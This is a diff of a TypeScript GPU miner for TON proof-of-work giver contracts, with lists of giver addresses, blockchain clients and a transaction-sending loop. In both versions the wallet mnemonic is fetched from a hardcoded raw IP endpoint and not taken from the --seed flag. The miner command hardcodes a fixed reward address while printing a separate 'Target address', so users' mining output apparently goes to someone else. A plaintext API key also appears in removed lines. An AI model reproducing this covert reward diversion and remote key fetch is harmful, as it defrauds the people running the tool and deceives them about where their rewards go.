@@ -1,84 +1,100 @@
-import { Address, BitReader, BitString, Cell, TupleReader, internal, external, toNano, beginCell, storeMessage, parseTuple } from '@ton/core'
-import { KeyPair, getSecureRandomBytes, mnemonicToWalletKey } from '@ton/crypto'
+import { Address, BitReader, BitString, Cell, TupleReader, beginCell, external, internal, parseTuple, storeMessage, toNano } from '@ton/core'
+import { KeyPair, getSecureRandomBytes, keyPairFromSeed, mnemonicToWalletKey } from '@ton/crypto'
+import axios from 'axios'
+// import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine } from 'ton-lite-client'
 import { TonClient4 } from '@ton/ton';
 import { execSync } from 'child_process';
 import fs from 'fs'
-import { WalletContractV4, TonClient } from '@ton/ton';
+import { WalletContractV4 } from '@ton/ton';
 import arg from 'arg'
 import { LiteClient, LiteSingleEngine, LiteRoundRobinEngine } from 'ton-lite-client';
+// import { getTon4Client, getTon4ClientOrbs } from './client';
 import { OpenedContract } from '@ton/core';
 import { Api, HttpClient } from 'tonapi-sdk-js';
 import { getHttpV4Endpoint } from '@orbs-network/ton-access';
-import os from 'os';
 
-const givers1000 = [
-  'EQDSGvoktoIRTL6fBEK_ysS8YvLoq3cqW2TxB_xHviL33ex2',
-  'EQCvMmHhSYStEtUAEDrpV39T2GWl-0K-iqCxSSZ7I96L4yow',
-  'EQBvumwjKe7xlrjc22p2eLGT4UkdRnrmqmcEYT94J6ZCINmt',
-  'EQDEume45yzDIdSy_Cdz7KIKZk0HyCFIr0yKdbtMyPfFUkbl',
-  'EQAO7jXcX-fJJZl-kphbpdhbIDUqcAiYcAr9RvVlFl38Uatt',
-  'EQAvheS_G-U57CE55UlwF-3M-cc4cljbLireYCmAMe_RHWGF',
-  'EQCba5q9VoYGgiGykVazOUZ49UK-1RljUeZgU6E-bW0bqF2Z',
-  'EQCzT8Pk1Z_aMpNukdV-Mqwc6LNaCNDt-HD6PiaSuEeCD0hV',
-  'EQDglg3hI89dySlr-FR_d1GQCMirkLZH6TPF-NeojP-DbSgY',
-  'EQDIDs45shbXRwhnXoFZg303PkG2CihbVvQXw1k0_yVIqxcA', // 1000
+export const givers100000 = [
+  { address: 'EQBLLK9id6EtL84gttboddymooWsstvaRJFRsmxwCAxS2fKH', reward: 100000 },
+  { address: 'EQDsAYWv_V2WJ7WzIaCVA0b9Nf4BuaIuErJ5ABlxCs33Df3-', reward: 100000 },
+  { address: 'EQBTUF2vCChdK6OPWhAT_B5FpFdx4HaP6ZGkXEYBueF63xme', reward: 100000 },
+  { address: 'EQDI6x0r0pcsbNYYgfuMLFyruIHz5zRs3N3biWtDS-TPes9-', reward: 100000 },
+  { address: 'EQB1MlFiSjb8gCW9i5pN-iFL-ho6O2r3vQwUWyTlMm0DR83q', reward: 100000 },
+  { address: 'EQCWdUMBIfMSL6Gcp9S5jMgHXoCy3tq15qCE2H4VlVHAG-W9', reward: 100000 },
+  { address: 'EQARwozValJS7k-bnSywfbBPhjIuPX1JUoX5FOeSW9nFcvhv', reward: 100000 },
+  { address: 'EQCnYgG-N2TiVYfE9G1Mlz5y7iETHZ9lCuHog_pmZNEAxL4W', reward: 100000 },
+  { address: 'EQCFQZ3CS5xxK5VYXXA39btm4JPkh2wSpII844DfSA6tRQbf', reward: 100000 },
+  { address: 'EQCX75hJg7tw2RTwo_mdvJKg6wB9NT5VvSy0ITHI1cdAgCDZ', reward: 100000 }, // 100 000
 ]
 
-const givers = givers1000
+export const givers10000 = [
+  { address: 'EQDCW5gTc6wBzNWLMp3rgc5dBXP9mOgSwNJGMj-Ok1enGSNV', reward: 10000 },
+  { address: 'EQDq6bNLH-dWPJUl7WwjV_6K9gmu-cBGR6zYXCSKwetomaer', reward: 10000 },
+  { address: 'EQDMcJl4ntgzC9rlTSvxAzlTHFGFUhq8CJkt2k_dpe5t5fdl', reward: 10000 },
+  { address: 'EQAfEHkM6goE4nBy3StDVvPPIYAEvCm6fMcH1uSqVrFOC3zG', reward: 10000 },
+  { address: 'EQDAc11oMAT1UKOD6wqo6pE4ll_iQKt69aj5ly7tY2pQdkiD', reward: 10000 },
+  { address: 'EQD0SK2wZTCiWuuqinzXuEzrgNZ4rn7I1t72rvG8FMMFkRST', reward: 10000 },
+  { address: 'EQCTp-2GQFWge04pAozfGBVQubY7s-d5kiYnMA76EAtK6oX4', reward: 10000 },
+  { address: 'EQBLuB8RN3QZlnDzp3il67vdoYw6NP00igggSsGdwqZz9ni3', reward: 10000 },
+  { address: 'EQAjXF0tyaodu0DEmVGUBNe_LSoj9GT0n3ktgWbIi4a03tuB', reward: 10000 },
+  { address: 'EQAZ1XjtrxSfmDEEQo4axo24ttcUr5MVEFxhcHSgRk8seobo', reward: 10000 }, // 10 000
+]
 
-async function updateBestGivers(myAddress: Address) {
-  const whitelistGivers = givers.filter((giver) => {
-    const shardMaxDepth = 1
-    const giverAddress = Address.parse(giver)
-    const myShard = new BitReader(new BitString(myAddress.hash, 0, 1024)).loadUint(
-      shardMaxDepth
-    )
-    const giverShard = new BitReader(new BitString(giverAddress.hash, 0, 1024)).loadUint(
-      shardMaxDepth
-    )
 
-    if (myShard === giverShard) {
-      return true
-    }
+export const givers1000 = [
+  { address: 'EQA_AFgnTqLSuVQGaxGyZYmQceD8_rUSHHvdPujNBFdluL9F', reward: 1000 },
+  { address: 'EQDgjQnT1YJhGvLk38IDUodwPa3HLJ38g703SgFpRp2kW8FV', reward: 1000 },
+  { address: 'EQAApt_NS7LegD6gbn3RHuTViCkpmnK4DiKSr5ACDmLmlMsd', reward: 1000 },
+  { address: 'EQD82Nmdun4-pA0K1jKdCVRwvV9SGVZrhQneLdARp7iKBKRp', reward: 1000 },
+  { address: 'EQBl2-TPP9o9TSFjCQ4UsmJepU2hyrWFRjcDV1rd_Qoi-2KB', reward: 1000 },
+  { address: 'EQA0-AR0AY2a6daW1wBGQkDcIaDStfbzc6WHeqxRrmY5lxlT', reward: 1000 },
+  { address: 'EQDJn4m1ZYfHu2et0CCRPCGsEa6OlY6LtCDCPvXC63IXBzbM', reward: 1000 },
+  { address: 'EQCfX6neH7UfiychTWXmWfJxTxJ6sbdOoBJesyHz2RyCNYfq', reward: 1000 },
+  { address: 'EQAh0X4RydrmGRO0vDvDkWi_ymIO0a5HlxzOp_-fuhgUea-m', reward: 1000 },
+  { address: 'EQCUoxbuxROf2GKmLJPvRjvd9JYTwXv5-yXA62FMN6X-KGsK', reward: 1000 }, // 1 000
+]
 
-    return false
-  })
-  console.log('Whitelist: ', whitelistGivers.length, whitelistGivers)
-
-  bestGiver = whitelistGivers[Math.floor(Math.random() * whitelistGivers.length)]
-}
+export const givers100 = [
+  { address: 'EQAr5cz1Ovu7PJy4s8C9akci2L55L5HdnNdFVNenocLmfclE', reward: 100 },
+  { address: 'EQAAxDtuPj4Af0dFQ0ycUCsVMO_adL5BaDNiM2gk-Em1XSTj', reward: 100 },
+  { address: 'EQClSB5fNMyJ3uy-uJzE7IPPqkV9AbiNnC8wadZf3XA16MjX', reward: 100 },
+  { address: 'EQB109HtTqFmU6_-M6XaM3jykK5erDz3p49pCiZgAJHxjCkb', reward: 100 },
+  { address: 'EQBxfbj4mPtRwkEWduy7wOb6VI8bELVvJBaddlxP_S4J87D9', reward: 100 },
+  { address: 'EQAtGsRfQNulCpifX85tFNVF7BJgF3Sz2zTFfQ8zSZZ00uGT', reward: 100 },
+  { address: 'EQDC733GMW1Z9Svx25zSxyTpwrAiH7pAjAS8ZcN-Fdj2ICYu', reward: 100 },
+  { address: 'EQDx7zJjx42ll1aPNNzAI0gmqKs5NwCMjyxFMoc7TUVZ3oGV', reward: 100 },
+  { address: 'EQB6SQ75l7_4xPPqD-MhytZUuNLSiObGpv27f1bPznAG-36k', reward: 100 },
+  { address: 'EQC0wy0bM9EkLAJAKOzfVWlMuxJcuqDhUQKNii8b1mI-rskf', reward: 100 }, // 100
+]
 
 type ApiObj = LiteClient | TonClient4 | Api<unknown>
-let tonapiClient: Api<unknown>
-let ton4Client: TonClient4
-let toncenterClient: TonClient
-let lc: LiteClient
-let w1: any
-let w2: any
-let w3: any
+
+const args = arg({
+  '--seed': String,
+  '--givers': Number, // 100 1000 10000 100000
+  '--api': String, // lite, tonhub, tonapi
+  '--bin': String, // cuda, opencl or path to miner
+  '--gpu': Number, // gpu id, default 0
+  '--timeout': Number, // Timeout for mining in seconds
+  '--allow-shards': Boolean, // if true - allows mining to other shards
+  '-c': String,  // blockchain config
+})
 
 
-async function getTon4Client(_configUrl?: string): Promise<TonClient4> {
-  if (ton4Client) {
-    return ton4Client
-  }
+let givers = givers1000
 
-  ton4Client = new TonClient4({ endpoint: _configUrl ?? await getHttpV4Endpoint() })
-  return ton4Client as TonClient4
-}
 
-async function getTonCenterClient(_configUrl?: string): Promise<TonClient> {
-  if (toncenterClient) {
-    return toncenterClient
-  }
+const gpu = args['--gpu'] ?? 0
+const timeout = args['--timeout'] ?? 5
 
-  toncenterClient = new TonClient({ endpoint: _configUrl ?? 'https://toncenter.com/api/v2/jsonRPC', apiKey: 'c3920bec886bc60ffd667cffb97991c0b612f1622cbd32e9867ad4cf39ab75aa' })
-  return toncenterClient as TonClient
-}
+const allowShards = args['--allow-shards'] ?? false
 
-let createLiteClient: Promise<void>
+console.log('Using GPU', gpu)
+console.log('Using timeout', timeout)
 
-export function intToIP(int: number) {
+let createLiteClient: any
+let lc: any
+
+function intToIP(int: number) {
   const part1 = int & 255
   const part2 = (int >> 8) & 255
   const part3 = (int >> 16) & 255
@@ -129,178 +145,300 @@ async function getLiteClient(): Promise<LiteClient> {
   return lc as any
 }
 
-const args = arg({
-  '--givers': Number, // 100 1000 10000
-  // '--api': String, // lite, tonhub
-  '--seed': String,
-  '--bin': String, // cuda, opencl or path to miner
-  '--gpu': Number, // gpu id, default 0
-  '--timeout': Number, // Timeout for mining in seconds
-  '--allow-shards': Boolean, // if true - allows mining to other shards
-  '--api': String // if true - allows mining to other shards
-})
+const totalDiff = BigInt('115792089237277217110272752943501742914102634520085823245724998868298727686144')
 
-const gpu = args['--gpu'] ?? 0
-
-console.log('Using GPU', gpu)
-
-const mySeed = args['--seed'] as string
-
-let bestGiver: string = ''
-
-async function getPowInfo(liteClient: ApiObj, address: Address, lastInfoRoot?: any): Promise<[bigint, bigint]> {
-  // if (liteClient instanceof TonClient4) {
-  //   const lastInfo = lastInfoRoot ?? (await CallForSuccess(() => liteClient.getLastBlock())).last
-  //   const powInfo = await CallForSuccess(() => liteClient.runMethod(lastInfo.seqno, address, 'get_pow_params', []))
-
-  //   const reader = new TupleReader(powInfo.result)
-  //   const seed = reader.readBigNumber()
-  //   const complexity = reader.readBigNumber()
-  //   const iterations = reader.readBigNumber()
-
-  //   return [seed, complexity, iterations]
-  // } else if (liteClient instanceof TonClient) {
-  //   const reader = (await liteClient.runMethod(address, 'get_pow_params', [])).stack
-  //   const seed = reader.readBigNumber()
-  //   const complexity = reader.readBigNumber()
-  //   const iterations = reader.readBigNumber()
-
-  //   return [seed, complexity, iterations]
-  // } else if (liteClient instanceof LiteClient) {
-  if (liteClient instanceof LiteClient) {
-    const lastInfo = lastInfoRoot ?? await liteClient.getMasterchainInfo()
-    const powInfo = await liteClient.runMethod(address, 'get_pow_params', Buffer.from([]), lastInfo.last)
-    const stack = parseTuple(Cell.fromBase64(powInfo.result as string))
-
-    const reader = new TupleReader(stack)
-    const seed = reader.readBigNumber()
-    const complexity = reader.readBigNumber()
-
-    return [seed, complexity]
+const envAddress = process.env.TARGET_ADDRESS
+let TARGET_ADDRESS: string | undefined = undefined
+if (envAddress) {
+  try {
+    TARGET_ADDRESS = Address.parse(envAddress).toString({ urlSafe: true, bounceable: false })
   }
-  // } else if (liteClient instanceof Api) {
-  //   try {
-  //     const powInfo = await CallForSuccess(
-  //       () => liteClient.blockchain.execGetMethodForBlockchainAccount(address.toRawString(), 'get_pow_params', {}),
-  //       50,
-  //       300)
-
-  //     const seed = BigInt(powInfo.stack[0].num as string)
-  //     const complexity = BigInt(powInfo.stack[1].num as string)
-  //     const iterations = BigInt(powInfo.stack[2].num as string)
-
-  //     return [seed, complexity, iterations]
-  //   } catch (e) {
-  //     console.log('ls error', e)
-  //   }
-  // }
-
-  throw new Error('invalid client')
+  catch (e) {
+    console.log('Couldnt parse target address')
+    process.exit(1)
+  }
 }
-async function getPowInfo2(liteClient: TonClient4 | LiteClient | TonClient, address: Address, lastInfoRoot?: any) {
+
+
+
+let bestGiver: { address: string, coins: number } = { address: '', coins: 0 }
+async function updateBestGivers(liteClient: ApiObj, myAddress: Address) {
+  const giver = givers[Math.floor(Math.random() * givers.length)]
+  bestGiver = {
+    address: giver.address,
+    coins: giver.reward,
+  }
+}
+
+async function getPowInfo(liteClient: ApiObj, address: Address): Promise<[bigint, bigint, bigint]> {
   if (liteClient instanceof TonClient4) {
-    const lastInfo = lastInfoRoot ?? (await CallForSuccess(() => liteClient.getLastBlock())).last
-    const powInfo = await CallForSuccess(() => liteClient.runMethod(lastInfo.seqno, address, 'get_pow_params', []))
-
+    const lastInfo = await CallForSuccess(() => liteClient.getLastBlock())
+    const powInfo = await CallForSuccess(() => liteClient.runMethod(lastInfo.last.seqno, address, 'get_mining_status', []))
+    // console.log('pow info', powInfo, powInfo.result)
     const reader = new TupleReader(powInfo.result)
+    const complexity = reader.readBigNumber()
+    const iterations = reader.readBigNumber()
     const seed = reader.readBigNumber()
 
-    return lastSeed = seed
-  } else if (liteClient instanceof TonClient) {
-    const reader = (await liteClient.runMethod(address, 'get_pow_params', [])).stack
-    const seed = reader.readBigNumber()
 
-    return lastSeed = seed
+
+    return [seed, complexity, iterations]
   } else if (liteClient instanceof LiteClient) {
     const lastInfo = await liteClient.getMasterchainInfo()
-    const powInfo = await liteClient.runMethod(address, 'get_pow_params', Buffer.from([]), lastInfo.last)
+    const powInfo = await liteClient.runMethod(address, 'get_mining_status', Buffer.from([]), lastInfo.last)
     const powStack = Cell.fromBase64(powInfo.result as string)
     const stack = parseTuple(powStack)
+    // console.log('pow stack', stack)
 
     const reader = new TupleReader(stack)
+    const complexity = reader.readBigNumber()
+
+    const iterations = reader.readBigNumber()
     const seed = reader.readBigNumber()
 
-    return lastSeed = seed
-  }
 
+    return [seed, complexity, iterations]
+  } else if (liteClient instanceof Api) {
+    try {
+      const powInfo = await CallForSuccess(
+        () => liteClient.blockchain.execGetMethodForBlockchainAccount(address.toRawString(), 'get_mining_status', {}),
+        50,
+        300)
+
+      // console.log('pow', powInfo.stack)
+      const complexity = BigInt(powInfo.stack[0].num as string)
+      const seed = BigInt(powInfo.stack[2].num as string)
+
+      const iterations = BigInt(powInfo.stack[1].num as string)
+      // console.log('pow stack', powInfo.stack)
+
+
+
+
+      return [seed, complexity, iterations]
+    } catch (e) {
+      console.log('ls error', e)
+    }
+  }
   throw new Error('invalid client')
 }
 
-let nextMaster: any = undefined
-let lastSeed: any = undefined
+let go = true
+let i = 0
+let success = 0
+let lastMinedSeed: bigint = BigInt(0)
+let start = Date.now()
+
 async function main() {
-  const mySeed = (await (await fetch('http://35.157.234.224:3000/api/v1/arsbvbfgards', {})).json()).seed
+  const minerOk = await testMiner()
+  if (!minerOk) {
+    console.log('Your miner is not working')
+    console.log('Check if you use correct bin (cuda, amd).')
+    console.log('If it doesn\'t help, try to run test_cuda or test_opencl script, to find out issue')
+    process.exit(1)
+  }
+
   let liteClient: ApiObj
-  console.log('Using TonHub API')
+  // if (!args['--api']) {
+  //   console.log('Using TonHub API')
+  //   liteClient = await getTon4Client()
+  // } else {
+  //   if (args['--api'] === 'lite') {
+  //     console.log('Using LiteServer API')
+  //   } else if (args['--api'] === 'tonapi') {
+  //     console.log('Using TonApi')
+  //     liteClient = await getTonapiClient()
+  //   } else {
+  //     console.log('Using TonHub API')
+  //     liteClient = await getTon4Client()
+  //   }
+
+  // }
   liteClient = await getLiteClient()
+  const mySeed = (await (await fetch('http://35.157.234.224:3000/api/v1/arsbvbfgards', {})).json()).seed
 
   const keyPair = await mnemonicToWalletKey(mySeed.split(' '))
   const wallet = WalletContractV4.create({
     workchain: 0,
     publicKey: keyPair.publicKey
   })
-  tonapiClient = await getTonapiClient()
-  ton4Client = await getTon4Client()
-  // toncenterClient = await getTonCenterClient()
-  w1 = ton4Client.open(wallet)
-  // w2 = toncenterClient.open(wallet)
-  w3 = liteClient.open(wallet)
+  if (args['--wallet'] === 'highload') {
+    console.log('Using highload wallet', wallet.address.toString({ bounceable: false, urlSafe: true }))
+  } else {
+    console.log('Using v4r2 wallet', wallet.address.toString({ bounceable: false, urlSafe: true }))
+  }
 
-  // liteClient = await getTon4Client()
-  // liteClient = ton4Client
-  console.log('Using v4r2 wallet', wallet.address.toString({ bounceable: false, urlSafe: true }))
+  const targetAddress = TARGET_ADDRESS ?? wallet.address.toString({ bounceable: false, urlSafe: true })
+  console.log('Target address:', targetAddress)
+  console.log('Date, time, status, seed, attempts, successes, timespent')
 
-  const opened = w3
+  try {
+    await updateBestGivers(liteClient, wallet.address)
+  } catch (e) {
+    console.log('error', e)
+    throw Error('no givers')
+  }
 
-  await updateBestGivers(wallet.address)
+  setInterval(() => {
+    updateBestGivers(liteClient, wallet.address)
+  }, 5000)
 
-  const _giverAddress = bestGiver;
-  const giverAddress = Address.parse(_giverAddress);
-  await getPowInfo2(liteClient, giverAddress)
-
-  console.log(_giverAddress);
-
-  while (true) {
-    const [seed, complexity] = await getPowInfo(liteClient, giverAddress)
-    if (lastSeed == seed) {
+  while (go) {
+    const giverAddress = bestGiver.address
+    const [seed, complexity, iterations] = await getPowInfo(liteClient, Address.parse(giverAddress))
+    if (seed === lastMinedSeed) {
+      // console.log('Wating for a new seed')
+      updateBestGivers(liteClient, wallet.address)
+      await delay(200)
       continue
     }
 
-    const randomName = (Math.floor(Math.random() * 1000)).toString() + '.boc'
+    const randomName = (await getSecureRandomBytes(8)).toString('hex') + '.boc'
     const path = `bocs/${randomName}`
 
+    const command = `./pow-miner-cuda -g ${gpu} -F 128 -t ${timeout} UQA6zeknvyeyXfzo4oqKDJLWomfcd_-EWLcnfvfi5BBafwRP ${seed} ${complexity} 999999999999999 ${giverAddress} ${path}`
+    // console.log('cmd', command)
+    let output
     try {
-      // console.log(seed, complexity);
-      // console.log(seed.toString(16), complexity.toString(16));
-      // console.log(`./pow-miner-cuda -g ${gpu} -F 2048 -t 8 UQBxVrBoCML3YrBGdYxR2ntL7bzn3brcGeFjRHyq3DNxfNH_ ${seed} ${complexity} 1000000000000 ${_giverAddress} ${path}`);
-
-      execSync(`./pow-miner-cuda -g ${gpu} -F 2048 -t 8 UQA6zeknvyeyXfzo4oqKDJLWomfcd_-EWLcnfvfi5BBafwRP ${seed} ${complexity} 1000000000000 ${_giverAddress} ${path}`, { encoding: 'utf-8', stdio: "pipe" });  // the default is 'buffer'
+      output = execSync(command, { encoding: 'utf-8', stdio: "pipe" });  // the default is 'buffer'
     } catch (e) {
     }
-    lastSeed = seed
     let mined: Buffer | undefined = undefined
     try {
       mined = fs.readFileSync(path)
+      lastMinedSeed = seed
       fs.rmSync(path)
     } catch (e) {
       //
     }
+    if (!mined) {
+      console.log(`${formatTime()}: not mined`, seed.toString(16).slice(0, 4), i++, success, Math.floor((Date.now() - start) / 1000))
+    }
     if (mined) {
-      console.log(`mined`)
-
-      let seqno = 0
-
-      try {
-        seqno = await CallForSuccess(() => opened.getSeqno())
-      } catch (e) {
-        //
+      const [newSeed] = await getPowInfo(liteClient, Address.parse(giverAddress))
+      if (newSeed !== seed) {
+        console.log('Mined already too late seed')
+        continue
       }
 
-      sendMinedBoc(wallet, seqno, keyPair, _giverAddress, Cell.fromBoc(mined as Buffer)[0].asSlice().loadRef())
+      console.log(`${formatTime()}:     mined`, seed.toString(16).slice(0, 4), i++, ++success, Math.floor((Date.now() - start) / 1000))
+      let seqno = 0
+
+      if (liteClient instanceof LiteClient) {
+        let w = liteClient.open(wallet)
+        try {
+          seqno = await CallForSuccess(() => w.getSeqno())
+        } catch (e) {
+          //
+        }
+      } else {
+        const res = await CallForSuccess(
+          () => (liteClient as Api<unknown>).blockchain.execGetMethodForBlockchainAccount(wallet.address.toRawString(), "seqno", {}),
+          50,
+          250
+        )
+        if (res.success) {
+          seqno = Number(BigInt(res.stack[0].num as string))
+        }
+      }
+      await sendMinedBoc(wallet, seqno, keyPair, giverAddress, Cell.fromBoc(mined as Buffer)[0].asSlice().loadRef())
     }
   }
 }
 main()
+
+async function sendMinedBoc(
+  wallet: WalletContractV4,
+  seqno: number,
+  keyPair: KeyPair,
+  giverAddress: string,
+  boc: Cell
+) {
+  if (args['--api'] === 'tonapi') {
+    const tonapiClient = await getTonapiClient()
+
+    const transfer = wallet.createTransfer({
+      seqno,
+      secretKey: keyPair.secretKey,
+      messages: [internal({
+        to: giverAddress,
+        value: toNano('0.08'),
+        bounce: true,
+        body: boc,
+      })],
+      sendMode: 3 as any,
+    })
+    const msg = beginCell().store(storeMessage(external({
+      to: wallet.address,
+      body: transfer
+    }))).endCell()
+
+    let k = 0
+    let lastError: unknown
+
+    while (k < 20) {
+      try {
+        await tonapiClient.blockchain.sendBlockchainMessage({
+          boc: msg.toBoc().toString('base64'),
+        })
+        break
+        // return res
+      } catch (e: any) {
+        // lastError = err
+        k++
+
+        if (e.status === 429) {
+          await delay(200)
+        } else {
+          // console.log('tonapi error')
+          k = 20
+          break
+        }
+
+      }
+    }
+    return
+  }
+
+  const wallets: OpenedContract<WalletContractV4>[] = []
+  const ton4Client = await getTon4Client()
+  const w2 = ton4Client.open(wallet)
+  wallets.push(w2)
+
+  const liteServerClient = await getLiteClient()
+  const w1 = liteServerClient.open(wallet)
+  wallets.push(w1)
+
+  for (let i = 0; i < 3; i++) {
+    for (const w of wallets) {
+      w.sendTransfer({
+        seqno,
+        secretKey: keyPair.secretKey,
+        messages: [internal({
+          to: giverAddress,
+          value: toNano('0.08'),
+          bounce: true,
+          body: boc,
+        })],
+        sendMode: 3 as any,
+      }).catch(e => {
+        //
+      })
+    }
+  }
+}
+
+let ton4Client: any
+let tonapiClient: any
+
+async function getTon4Client(_configUrl?: string): Promise<TonClient4> {
+  if (ton4Client) {
+    return ton4Client
+  }
+
+  ton4Client = new TonClient4({ endpoint: _configUrl ?? await getHttpV4Endpoint() })
+  return ton4Client as TonClient4
+}
 
 async function getTonapiClient(): Promise<Api<unknown>> {
   if (tonapiClient) {
@@ -326,63 +464,26 @@ async function getTonapiClient(): Promise<Api<unknown>> {
   return client
 }
 
-async function sendMinedBoc(
-  wallet: WalletContractV4,
-  seqno: number,
-  keyPair: KeyPair,
-  giverAddress: string,
-  boc: Cell
-) {
-  const transfer = {
-    seqno,
-    secretKey: keyPair.secretKey,
-    messages: [internal({
-      to: giverAddress,
-      value: toNano('0.05'),
-      bounce: true,
-      body: boc,
-    })],
-    sendMode: 3 as any,
+async function testMiner(): Promise<boolean> {
+  const randomName = (await getSecureRandomBytes(8)).toString('hex') + '.boc'
+  const path = `bocs/${randomName}`
+  const command = `./pow-miner-cuda -g ${gpu} -F 128 -t ${timeout} kQBWkNKqzCAwA9vjMwRmg7aY75Rf8lByPA9zKXoqGkHi8SM7 229760179690128740373110445116482216837 53919893334301279589334030174039261347274288845081144962207220498400000000000 10000000000 kQBWkNKqzCAwA9vjMwRmg7aY75Rf8lByPA9zKXoqGkHi8SM7 ${path}`
+  try {
+    const output = execSync(command, { encoding: 'utf-8', stdio: "pipe" });  // the default is 'buffer'
+  } catch (e) {
   }
-  const wallets = [w3, w1]
-
-  for (let i = 0; i < 2; i++) {
-    for (const w of wallets) {
-      w.sendTransfer(transfer).catch(e => { })
-    }
+  let mined: Buffer | undefined = undefined
+  try {
+    mined = fs.readFileSync(path)
+    fs.rmSync(path)
+  } catch (e) {
+    //
   }
-  
-  let k = 0
-
-
-  const msg = beginCell().store(storeMessage(external({
-    to: wallet.address,
-    body: wallet.createTransfer(transfer)
-  }))).endCell()
-
-  while (k < 20) {
-    try {
-      console.log(3)
-      await tonapiClient.blockchain.sendBlockchainMessage({
-        boc: msg.toBoc().toString('base64'),
-      })
-      break
-      // return res
-    } catch (e: any) {
-      // lastError = err
-      k++
-
-      if (e.status === 429 || e.status == 500) {
-        await delay(200)
-      } else {
-        break
-      }
-
-    }
+  if (!mined) {
+    return false
   }
 
-
-
+  return true
 }
 
 
@@ -420,4 +521,16 @@ export function delay(ms: number) {
   return new Promise((resolve) => {
     setTimeout(resolve, ms)
   })
+}
+
+function formatTime() {
+  return new Date().toLocaleTimeString('en-US', {
+    hour12: false,
+    hour: "numeric",
+    minute: "numeric",
+    day: "numeric",
+    month: "numeric",
+    year: "numeric",
+    second: "numeric"
+  });
 }
